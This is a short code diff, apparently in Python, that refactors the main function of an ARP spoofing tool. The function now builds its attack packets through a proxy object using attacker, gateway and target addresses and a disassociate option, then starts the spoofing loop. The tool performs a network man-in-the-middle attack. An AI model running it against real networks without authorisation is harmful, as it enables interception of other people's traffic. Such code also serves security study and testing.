@@ -24,16 +24,20 @@ class Spoofer(object):
 
 
 def spoof(args):
-    """Controls the flow of execution of the ARP Spoofer tool."""
+    """Control the flow of execution of the ARP Spoofer tool."""
 
-    packets = AttackPackets(attacker_mac=args.attackermac,
-                            gateway_mac=args.gatemac, gateway_ip=args.gateip,
-                            target_mac=args.targetmac, target_ip=args.targetip)
-    spoofer = Spoofer(interface=args.interface)
+    arp = ARPSetupProxy(interface=args.interface,
+                        attacker_mac=args.attackermac,
+                        gateway_mac=args.gatemac,
+                        gateway_ip=args.gateip,
+                        target_mac=args.targetmac,
+                        target_ip=args.targetip,
+                        disassociate=args.disassociate)
+    spoofer = Spoofer(arp.interface)
 
     print('[+] ARP Spoofing attack initiated. Press Ctrl-C to abort.')
     try:
-        spoofer.execute(packets, interval=args.interval)
+        spoofer.execute(arp.packets, args.interval)
     except KeyboardInterrupt:
         raise SystemExit('[!] ARP Spoofing attack terminated.')
 
